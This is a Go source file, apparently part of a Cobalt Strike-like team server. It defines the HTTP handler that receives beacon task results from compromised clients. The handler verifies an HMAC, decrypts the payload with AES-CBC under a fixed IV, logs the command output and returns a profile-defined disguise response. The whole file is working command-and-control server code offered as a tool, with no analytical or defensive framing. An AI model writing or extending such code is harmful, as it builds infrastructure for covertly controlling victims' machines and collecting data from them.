package http

import (
	"NewCsTeamServer/client"
	"NewCsTeamServer/config"
	"NewCsTeamServer/crypt"
	"NewCsTeamServer/task"
	"bytes"
	"github.com/gin-gonic/gin"
	"log"
	"net/http"
	"strconv"
)

// HandleBeaconResult 处理客户端的任务结果
func HandleBeaconResult(c *gin.Context) {

	clientIDStr := c.Query(config.ProfileConfig.PostQuery)
	if clientIDStr == "" {
		c.String(http.StatusBadRequest, "缺少 client_id 参数")
		return
	}
	clientID, err := strconv.ParseUint(clientIDStr, 10, 32)
	if err != nil {
		c.String(http.StatusBadRequest, "无效的 client_id: %v", err)
		return
	}

	// 检查 ClientID 是否存在
	client, exists := client.GlobalClientManager.GetClient(uint32(clientID))
	if !exists {
		log.Printf("处理结果失败: 未找到客户端 %d", clientID)
		c.String(http.StatusNotFound, "未找到客户端 %d", clientID)
		return
	}
	body, _ := c.GetRawData()
	// 验证 SendLength
	if len(body) < 4+crypt.HmacHashLen {
		c.String(http.StatusBadRequest, "无效请求体: 太短 (%d 字节)", len(body))
		return
	}

	// 分离加密数据和 HMAC
	encryptedData := body[4 : len(body)-crypt.HmacHashLen]
	receivedHMAC := body[len(body)-crypt.HmacHashLen:]
	log.Printf("handleBeaconResult: 客户端 %d, 加密数据=%x, 收到 HMAC=%x", clientID, encryptedData, receivedHMAC)

	// 验证 HMAC
	expectedHMAC := crypt.HmacHash(encryptedData, client.HMACKey)
	if !bytes.Equal(receivedHMAC, expectedHMAC) {
		log.Printf("HMAC 验证失败，客户端 %d", clientID)
		c.String(http.StatusUnauthorized, "无效 HMAC 签名")
		return
	}

	// 解密数据（补充 IV 前缀）
	iv := config.Iv
	decryptedData, err := crypt.AesCBCDecrypt(append(iv, encryptedData...), client.AESKey)
	if err != nil {
		log.Printf("解密失败，客户端 %d: %v", clientID, err)
		c.String(http.StatusInternalServerError, "解密失败: %v", err)
		return
	}
	log.Printf("handleBeaconResult: 客户端 %d, 解密数据=%x", clientID, decryptedData)

	// 解析任务结果
	result, err := task.ParseTaskResult(decryptedData)
	if err != nil {
		c.String(http.StatusBadRequest, "解析任务结果失败: %v", err)
		return
	}

	// 存储结果
	//cm.AddResult(uint32(clientID), result)
	log.Printf("收到客户端 %d 的结果: TaskID=%s, Output=%s", clientID, result.TaskID, string(result.Output))

	// 返回成功响应
	// 返回成功响应
	c.String(http.StatusOK, "%s", config.ProfileConfig.PostRetBody)
	return
}
